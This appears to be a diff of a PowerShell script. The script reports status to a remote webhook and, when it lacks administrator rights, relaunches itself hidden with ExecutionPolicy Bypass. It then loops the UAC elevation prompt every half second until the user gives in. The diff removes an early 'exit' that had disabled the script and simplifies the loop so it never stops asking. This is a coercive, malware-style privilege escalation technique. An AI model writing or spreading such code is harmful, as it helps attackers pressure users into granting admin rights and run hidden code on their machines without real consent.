@@ -14,22 +14,19 @@ function Send-WebhookMessage {
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
 try {
-    exit
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     Send-WebhookMessage -Message "Admin privileges: $isAdmin"
 
     if (-not $isAdmin) {
-        while (-not $isAdmin) {
-            Send-WebhookMessage -Message "Not admin. Requesting elevation..."
+        while ($true) {
             try {
                 $filePath = $PSCommandPath
-                $psCode = $args[0]
-                Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`" `"$psCode`"" -Verb RunAs -ErrorAction Stop
+                Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`"" -Verb RunAs -ErrorAction Stop
                 exit
-            }
+            } 
             catch {
-                Send-WebhookMessage -Message "Elevation failed. Retrying..."
-                $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+                Send-WebhookMessage -Message "Elevation failed. Retrying UAC prompt..."
+                Start-Sleep -Milliseconds 500
             }
         }
     }
